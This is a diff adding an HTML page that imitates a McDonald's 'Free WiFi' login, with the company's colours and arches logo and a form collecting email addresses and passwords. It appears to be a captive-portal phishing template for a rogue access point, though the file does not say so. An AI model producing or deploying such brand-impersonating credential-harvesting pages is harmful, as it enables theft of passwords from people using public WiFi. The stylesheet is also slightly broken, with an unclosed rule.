@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>McDonald's Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffbb00;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        .login-container {
+            background-color: #ff0000;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 7px #00000038;
+            text-align: center;
+            width: 75%;
+            max-width: 375px;
+        }
+        .login-container img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .login-container h1 {
+            color: #ebebeb;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 75%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 65%;
+            padding: 10px;
+            background-color: #ffbb00;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            color: #ffffff;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .login-container button:hover {
+            background-color: #680000;
+        }
+        .login-container p {
+            color: #ffffff;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+        .login-container a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <svg xmlns="http://www.w3.org/2000/svg" height="100.5" width="272.7" viewBox="0 0 272.70001 238.5">
+            <path fill="#fc0" d="m195.8 17.933c23.3 0 42.2 98.3 42.2 219.7h34c0-130.7-34.3-236.5-76.3-236.5-24 0-45.2 31.7-59.2 81.5-14-49.8-35.2-81.5-59-81.5-42 0-76.2 105.7-76.2 236.4h34c0-121.4 18.7-219.6 42-219.6s42.2 90.8 42.2 202.8h33.8c0-112 19-202.8 42.3-202.8"/>
+            </svg> 
+        <h1>Free WiFi</h1>
+        <form action="/login" method="POST">
+            <input type="email" name="email" placeholder="Email Address" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <p>Don't have an account? <a href="/register">Sign up</a></p>
+    </div>
+</body>
+</html>
